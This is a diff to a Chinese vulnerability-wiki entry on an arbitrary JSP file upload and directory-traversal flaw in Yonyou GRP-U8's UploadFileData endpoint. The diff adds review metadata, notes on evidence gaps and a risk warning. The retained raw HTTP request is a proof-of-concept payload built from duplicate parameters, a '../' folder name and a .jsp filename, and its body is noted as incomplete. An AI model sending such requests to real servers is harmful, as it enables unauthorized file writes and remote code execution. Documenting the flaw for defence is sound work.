@@ -1,11 +1,51 @@
 ---
-fofa: "查询语句"
 source: "MrWQ/vulnerability-paper"
+title: "用友GRP-U8 UploadFileData重复参数/目录穿越上传"
+product: "用友GRP-U8"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "R10声明"
+prerequisites: "Cookie示例，未确认未授权"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://mp.weixin.qq.com/s/OEk9Muj5-QobFjslNxplVA"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20GRP-U8%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: "查询语句"
+id: "vw-046565bf916bee92bcd91e73"
+entity_id: "ve-046565bf916bee92bcd91e73"
+schema_version: "1"
 ---
 
-# 用友 GRP-U8 存在任意文件上传漏洞
+# 用友GRP-U8 UploadFileData重复参数/目录穿越上传
 
-<meta name="referrer" content="no-referrer"/>
+## 条目说明
+
+- 对象与具体问题：用友GRP-U8；UploadFileData重复参数/目录穿越上传
+- 版本、配置及部署条件：R10声明
+- 认证与权限前提：Cookie示例，未确认未授权
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- multipart Content-Type缺boundary，Content-Disposition丢name/filename
+- 重复1参数和双filename顺序很关键但未解释；非普通上传
+- POC&EXP无与正文有请求是脚本未提供应改措辞
+- FOFA误取查询语句；补丁htinfo域归属需核，不仅链接存在
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OEk9Muj5-QobFjslNxplVA)
 
 用友 GRP-U8 存在任意文件上传漏洞 
@@ -48,17 +88,16 @@ app="用友 - GRP-U8"
 
 漏洞数据包：
 
-```
+```http
 POST http://127.0.0.1/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg HTTP/1.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
 Accept-Encoding: gzip, deflate
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Connection: keep-alive
 Accept-Language: zh-CN,zh;q=0.9
-Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
+Cookie: JSESSIONID=5******************************9
 Content-Type: multipart/form-data
 Upgrade-Insecure-Requests: 1
-Content-Length: 177
 
 --ec126a48c5b7676dce1b676f5251358f
 Content-Disposition: form-data; 
@@ -68,6 +107,8 @@ Content-Disposition: form-data;
 
 
 ```
+
+> 请求长度说明：原资料 Content-Length 为 177；静态长度已移除，应由客户端根据最终请求体的字节数生成。
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpa9VZLpV6pst5MXENicalOrn5tmI9uy48Mkd7DhapVvg1JSQic0X2PhLwA/640?wx_fmt=png)
 
